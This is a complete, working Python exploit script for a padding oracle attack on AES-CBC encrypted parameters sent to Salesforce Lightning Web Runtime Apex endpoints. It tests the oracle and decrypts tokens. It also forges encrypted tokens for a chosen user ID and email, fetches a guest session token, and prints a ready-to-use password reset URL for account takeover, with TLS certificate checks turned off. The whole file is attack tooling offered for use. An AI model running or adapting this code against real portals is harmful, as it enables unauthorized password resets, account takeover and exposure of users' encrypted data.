#!/usr/bin/env python3
"""
AES-CBC Padding Oracle Attack for Salesforce LWR Apex Endpoints

Exploits differential error responses in Salesforce Lightning Web Runtime
Apex controllers that accept AES-CBC encrypted parameters.

Oracle states:
  -1  "Input length must be multiple of 16"  (invalid length)
   0  "Given final block not properly padded" (bad padding)
   1  "No content to map to Object" / 200 OK  (valid decryption)

Usage:
  python3 aes_cbc_poa.py --host TARGET --classname CLASS --method METHOD --test
  python3 aes_cbc_poa.py --host TARGET --classname CLASS --method METHOD --decrypt <token>
  python3 aes_cbc_poa.py --host TARGET --classname CLASS --method METHOD --forge --userid ID --email EMAIL

Author: vailsec
"""

import argparse
import base64
import http.cookiejar
import json
import os
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

BLOCK_SIZE = 16
MAX_RETRIES = 3
RETRY_BACKOFF = [1, 2, 4]

_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE


class Stats:
    def __init__(self):
        self._count = 0
        self._lock = threading.Lock()
        self.start_time = time.time()

    def increment(self):
        with self._lock:
            self._count += 1
            return self._count

    @property
    def count(self):
        with self._lock:
            return self._count

    @property
    def elapsed(self):
        return time.time() - self.start_time

    @property
    def rps(self):
        e = self.elapsed
        return self._count / e if e > 0 else 0


_stats = Stats()
_print_lock = threading.Lock()


def log(msg, verbose_only=False, verbose=False):
    if verbose_only and not verbose:
        return
    with _print_lock:
        print(msg, flush=True)


def log_err(msg):
    with _print_lock:
        print(msg, file=sys.stderr, flush=True)


def oracle(ciphertext_b64, target_url, classname, method):
    """Returns -1 (error), 0 (bad padding), or 1 (valid decryption)."""
    _stats.increment()

    payload = json.dumps({
        "namespace": "",
        "classname": classname,
        "method": method,
        "cacheable": False,
        "isContinuation": False,
        "params": {"encryptedParams": ciphertext_b64}
    }).encode()

    req = urllib.request.Request(
        target_url, data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    for attempt in range(MAX_RETRIES):
        try:
            resp = urllib.request.urlopen(req, context=_ssl_ctx, timeout=15)
            resp.read()
            return 1
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            if "not properly padded" in body:
                return 0
            if "Input length must be multiple of 16" in body:
                return -1
            if "JSONException" in body or "No content to map" in body:
                return 1
            if "NullPointerException" in body or "StringException" in body:
                return 1
            if "Apex request is invalid" in body:
                return -1
            log_err(f"  [?] Unknown response (#{_stats.count}): {body[:250]}")
            return -1
        except Exception as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_BACKOFF[attempt])
                continue
            log_err(f"  [!] Network error: {e}")
            return -1
    return -1


def pkcs7_pad(data):
    pad_len = BLOCK_SIZE - (len(data) % BLOCK_SIZE)
    return data + bytes([pad_len] * pad_len)


def pkcs7_unpad(data):
    if not data:
        return data, 0
    pad_len = data[-1]
    if pad_len < 1 or pad_len > BLOCK_SIZE:
        return data, 0
    if all(b == pad_len for b in data[-pad_len:]):
        return data[:-pad_len], pad_len
    return data, 0


def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def decrypt_block(prev_block, cipher_block, block_num, total_blocks,
                  target_url, classname, method, verbose=False):
    """Recover plaintext of a single block via padding oracle."""
    intermediate = bytearray(BLOCK_SIZE)
    plaintext = bytearray(BLOCK_SIZE)

    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        padding_value = BLOCK_SIZE - byte_pos

        crafted = bytearray(BLOCK_SIZE)
        for k in range(byte_pos + 1, BLOCK_SIZE):
            crafted[k] = intermediate[k] ^ padding_value

        found = False
        for guess in range(256):
            crafted[byte_pos] = guess
            test_ct = bytes(crafted) + cipher_block
            test_b64 = base64.b64encode(test_ct).decode()

            if oracle(test_b64, target_url, classname, method) == 1:
                if byte_pos == BLOCK_SIZE - 1:
                    confirm = bytearray(crafted)
                    confirm[0] ^= 0x01
                    confirm_b64 = base64.b64encode(bytes(confirm) + cipher_block).decode()
                    if oracle(confirm_b64, target_url, classname, method) != 1:
                        continue

                intermediate[byte_pos] = guess ^ padding_value
                plaintext[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]

                byte_num = BLOCK_SIZE - byte_pos
                ch = chr(plaintext[byte_pos]) if 32 <= plaintext[byte_pos] < 127 else "."
                log(f"  [Block {block_num}/{total_blocks}] byte {byte_num:2d}/16: "
                    f"0x{plaintext[byte_pos]:02x} '{ch}'",
                    verbose_only=True, verbose=verbose)
                found = True
                break

        if not found:
            log_err(f"  [!] Block {block_num}: failed at position {byte_pos}")
            return bytes(plaintext), False

    return bytes(plaintext), True


def decrypt_token(token_b64, target_url, classname, method,
                  num_threads=7, verbose=False):
    """Decrypt AES-CBC token with parallel block decryption."""
    ciphertext = base64.b64decode(token_b64)

    if len(ciphertext) % BLOCK_SIZE != 0:
        log_err(f"[!] Length {len(ciphertext)} not multiple of {BLOCK_SIZE}")
        sys.exit(1)

    num_blocks = len(ciphertext) // BLOCK_SIZE
    pt_count = num_blocks - 1

    log(f"[*] Ciphertext  : {len(ciphertext)} bytes ({num_blocks} blocks)")
    log(f"[*] Plaintext   : {pt_count} blocks ({pt_count * BLOCK_SIZE} bytes)")
    log(f"[*] Threads     : {min(num_threads, pt_count)}")
    log(f"[*] Est requests: ~{128 * pt_count * BLOCK_SIZE} avg")
    log("")

    blocks = [ciphertext[i:i + BLOCK_SIZE] for i in range(0, len(ciphertext), BLOCK_SIZE)]
    results = [None] * pt_count
    success = [False] * pt_count

    global _stats
    _stats = Stats()

    with ThreadPoolExecutor(max_workers=min(num_threads, pt_count)) as pool:
        futures = {}
        for i in range(1, num_blocks):
            f = pool.submit(decrypt_block, blocks[i-1], blocks[i],
                           i, pt_count, target_url, classname, method, verbose)
            futures[f] = i - 1

        for future in as_completed(futures):
            idx = futures[future]
            block_pt, ok = future.result()
            results[idx] = block_pt
            success[idx] = ok

            done = sum(1 for r in results if r is not None)
            pct = done / pt_count * 100
            elapsed = _stats.elapsed
            eta = elapsed / done * (pt_count - done) if done > 0 else 0

            log(f"\n  [{done}/{pt_count} blocks ({pct:.0f}%) | "
                f"{elapsed:.1f}s | ETA {eta:.0f}s | "
                f"{_stats.count} reqs ({_stats.rps:.1f}/s)]\n")

    plaintext = b"".join(results)
    plaintext, pad_len = pkcs7_unpad(plaintext)
    if pad_len > 0:
        log(f"[*] Removed {pad_len} bytes PKCS#7 padding")

    return plaintext, all(success)


def forge_block(desired_pt, next_ct, target_url, classname, method,
                block_num, total_blocks, verbose=False, forge_threads=16):
    """Find intermediate values via oracle with parallel byte guessing."""
    intermediate = bytearray(BLOCK_SIZE)

    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        padding_value = BLOCK_SIZE - byte_pos

        base_crafted = bytearray(BLOCK_SIZE)
        for k in range(byte_pos + 1, BLOCK_SIZE):
            base_crafted[k] = intermediate[k] ^ padding_value

        found = False
        found_guess = None
        stop_event = threading.Event()

        def try_guess(guess):
            if stop_event.is_set():
                return None
            c = bytearray(base_crafted)
            c[byte_pos] = guess
            test_b64 = base64.b64encode(bytes(c) + next_ct).decode()
            if oracle(test_b64, target_url, classname, method) == 1:
                if byte_pos == BLOCK_SIZE - 1:
                    confirm = bytearray(c)
                    confirm[0] ^= 0x01
                    confirm_b64 = base64.b64encode(bytes(confirm) + next_ct).decode()
                    if oracle(confirm_b64, target_url, classname, method) != 1:
                        return None
                return guess
            return None

        with ThreadPoolExecutor(max_workers=forge_threads) as pool:
            futures = {pool.submit(try_guess, g): g for g in range(256)}
            for future in as_completed(futures):
                result = future.result()
                if result is not None and not stop_event.is_set():
                    stop_event.set()
                    found_guess = result
                    found = True

        if found and found_guess is not None:
            intermediate[byte_pos] = found_guess ^ padding_value
            byte_num = BLOCK_SIZE - byte_pos
            log(f"  [Forge {block_num}/{total_blocks}] byte {byte_num:2d}/16: "
                f"I=0x{intermediate[byte_pos]:02x}",
                verbose_only=True, verbose=verbose)
        else:
            log_err(f"  [!] Forge failed at block {block_num} position {byte_pos}")
            return None

    return xor_bytes(bytes(intermediate), desired_pt)


def forge_token(userid, email, timestamp, target_url, classname, method,
                verbose=False, forge_threads=16):
    """Forge AES-CBC token via Vaudenay's encryption-through-oracle attack."""
    token_json = json.dumps(
        {"userid": userid, "un": email, "timestamp": str(timestamp)},
        separators=(",", ":")
    )
    padded = pkcs7_pad(token_json.encode("utf-8"))
    pt_blocks = [padded[i:i+BLOCK_SIZE] for i in range(0, len(padded), BLOCK_SIZE)]
    n = len(pt_blocks)

    log(f"[*] Payload  : {token_json}")
    log(f"[*] Padded   : {len(padded)} bytes ({n} blocks)")
    log(f"[*] Threads  : {forge_threads} (per-byte parallel guessing)")
    log(f"[*] Est reqs : ~{128 * n * BLOCK_SIZE} avg")
    log("")

    global _stats
    _stats = Stats()

    ct_blocks = [None] * (n + 1)
    ct_blocks[n] = os.urandom(BLOCK_SIZE)

    for i in range(n - 1, -1, -1):
        block_num = n - i
        elapsed = _stats.elapsed
        done = n - 1 - i
        eta = elapsed / done * (i + 1) if done > 0 else 0

        log(f"[*] Block {block_num}/{n} | {_stats.count} reqs | "
            f"{elapsed:.1f}s | ETA {eta:.0f}s")

        forged = forge_block(pt_blocks[i], ct_blocks[i+1],
                            target_url, classname, method,
                            block_num, n, verbose, forge_threads)
        if forged is None:
            log_err("[!] Forge failed. Aborting.")
            sys.exit(1)
        ct_blocks[i] = forged

    ciphertext = b"".join(ct_blocks)
    return base64.b64encode(ciphertext).decode(), token_json


def test_oracle(target_url, classname, method):
    """Verify the three oracle states."""
    log(f"[*] Testing oracle: {classname}.{method}")
    log("")

    r1 = oracle(base64.b64encode(b"\x00" * 30).decode(), target_url, classname, method)
    log(f"  State 1 (wrong length,  30B): {r1:2d}  expect -1  [{'PASS' if r1 == -1 else 'FAIL'}]")

    r2 = oracle(base64.b64encode(b"\x00" * 32).decode(), target_url, classname, method)
    log(f"  State 2 (bad padding,   32B): {r2:2d}  expect  0  [{'PASS' if r2 == 0 else 'FAIL'}]")

    r3 = oracle(base64.b64encode(b"\x00" * 16).decode(), target_url, classname, method)
    log(f"  State 3 (16B edge case):      {r3:2d}")
    log("")

    ok = (r1 == -1 and r2 == 0)
    log(f"[{'+'if ok else '-'}] Oracle {'CONFIRMED' if ok else 'NOT'} exploitable.")
    return ok


def print_decrypted(plaintext, elapsed, count):
    sep = "=" * 60
    log(f"\n{sep}")
    log(f"[+] DECRYPTED TOKEN ({elapsed:.1f}s, {count} requests)")
    log(f"    Raw : {plaintext.hex()}")
    log(f"    Text: {plaintext.decode('utf-8', errors='replace')}")
    try:
        parsed = json.loads(plaintext)
        log(f"    JSON:")
        for k, v in parsed.items():
            log(f"      {k.ljust(12)}: {v}")
        if "timestamp" in parsed:
            ts = int(parsed["timestamp"]) / 1000.0
            log(f"      {'decoded'.ljust(12)}: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(ts))}")
    except (json.JSONDecodeError, ValueError, OSError):
        pass
    log(sep)


def print_forged(token_b64, token_json, elapsed, count):
    sep = "=" * 60
    log(f"\n{sep}")
    log(f"[+] FORGED TOKEN ({elapsed:.1f}s, {count} requests)")
    log(f"    Plaintext: {token_json}")
    log(f"    Size     : {len(base64.b64decode(token_b64))} bytes")
    log(f"    Base64   : {token_b64}")
    log(sep)


def fetch_guest_token(host):
    """Fetch a Salesforce guest session token from the Community page."""
    cookie_jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cookie_jar),
        urllib.request.HTTPSHandler(context=_ssl_ctx)
    )

    url = f"https://{host}/s/"
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/131.0.0.0 Safari/537.36"
        })
        resp = opener.open(req, timeout=15)
        body = resp.read().decode("utf-8", errors="replace")

        # Pattern 1: Aura config token in inline JS
        m = re.search(r'"token"\s*:\s*"([A-Za-z0-9_!.]+)"', body)
        if m:
            return m.group(1)

        # Pattern 2: SID cookie
        for cookie in cookie_jar:
            if cookie.name == "sid" and cookie.value:
                return cookie.value
    except Exception:
        pass

    return None


def main():
    parser = argparse.ArgumentParser(
        description="AES-CBC Padding Oracle Attack for Salesforce LWR Apex Endpoints",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --host example.com --classname Controller --method decryptMethod --test
  %(prog)s --host example.com --classname Controller --method decryptMethod --decrypt <token>
  %(prog)s --host example.com --classname Controller --method decryptMethod --forge --userid ID --email user@email.com
        """
    )

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--test", action="store_true", help="Test oracle states")
    mode.add_argument("--decrypt", type=str, metavar="TOKEN", help="Decrypt base64 token")
    mode.add_argument("--forge", action="store_true", help="Forge new encrypted token")

    parser.add_argument("--host", type=str, required=True,
                       help="Target hostname (e.g., portal.example.com)")
    parser.add_argument("--classname", type=str, required=True,
                       help="Apex controller class name")
    parser.add_argument("--method", type=str, required=True,
                       help="Apex method that accepts encryptedParams")

    parser.add_argument("--userid", type=str, help="Target Salesforce User ID (forge mode)")
    parser.add_argument("--email", type=str, help="Target email address (forge mode)")
    parser.add_argument("--timestamp", type=str, default=None,
                       help="Epoch ms for forged token (default: now)")
    parser.add_argument("--threads", type=int, default=7,
                       help="Parallel threads for decrypt (default: 7)")
    parser.add_argument("--forge-threads", type=int, default=16,
                       help="Parallel guess threads for forge (default: 16)")
    parser.add_argument("--token", type=str, default=None,
                       help="Salesforce session token for URL (auto-fetched if omitted)")
    parser.add_argument("--verbose", action="store_true",
                       help="Show per-byte progress")

    args = parser.parse_args()

    if args.forge and (not args.userid or not args.email):
        parser.error("--forge requires --userid and --email")
    if args.forge and not args.timestamp:
        args.timestamp = str(int(time.time() * 1000))

    target_url = f"https://{args.host}/s/webruntime/api/apex/execute"

    log(f"\n  AES-CBC Padding Oracle Attack")
    log(f"  Host  : {args.host}")
    log(f"  Target: {target_url}")
    log(f"  Oracle: {args.classname}.{args.method}\n")

    if args.test:
        sys.exit(0 if test_oracle(target_url, args.classname, args.method) else 1)

    elif args.decrypt:
        try:
            base64.b64decode(args.decrypt)
        except Exception:
            log_err("[!] Invalid base64"); sys.exit(1)

        if not test_oracle(target_url, args.classname, args.method):
            log_err("[!] Oracle test failed"); sys.exit(1)
        log("")

        start = time.time()
        pt, ok = decrypt_token(args.decrypt, target_url, args.classname,
                               args.method, args.threads, args.verbose)
        print_decrypted(pt, time.time() - start, _stats.count)
        if not ok:
            sys.exit(1)

    elif args.forge:
        log(f"[*] Forging for: {args.email} ({args.userid})")
        log(f"[*] Timestamp  : {args.timestamp}\n")

        if not test_oracle(target_url, args.classname, args.method):
            log_err("[!] Oracle test failed"); sys.exit(1)
        log("")

        start = time.time()
        token_b64, token_json = forge_token(
            args.userid, args.email, args.timestamp,
            target_url, args.classname, args.method,
            args.verbose, args.forge_threads)
        elapsed = time.time() - start

        print_forged(token_b64, token_json, elapsed, _stats.count)

        log("\n[*] Verifying forged token...")
        r = oracle(token_b64, target_url, args.classname, args.method)
        log(f"[{'+'if r==1 else '-'}] Verification: {'PASS' if r==1 else 'FAIL'}")
        if r != 1:
            sys.exit(1)

        # Obtain Salesforce session token for URL
        sf_token = args.token
        if not sf_token:
            log("\n[*] Fetching guest session token...")
            sf_token = fetch_guest_token(args.host)
            if sf_token:
                log(f"[+] Token: {sf_token[:20]}...")
            else:
                log("[!] Could not auto-fetch token. URL may not work without --token.")

        # Build ready-to-use password reset URL
        # Single-encode the full retURL value (matching Salesforce email link format)
        ret_url_inner = f"ForgotPassword?params={token_b64}&country=IE&language=en_IE&source=reset"
        if sf_token:
            ret_url_inner += f"&token={sf_token}"
        ret_url_encoded = urllib.parse.quote(ret_url_inner, safe='')
        reset_url = f"https://{args.host}/s/confirmation-link-is-expired?retURL={ret_url_encoded}"

        log(f"\n[+] Password Reset URL:")
        log(f"    {reset_url}")


if __name__ == "__main__":
    main()
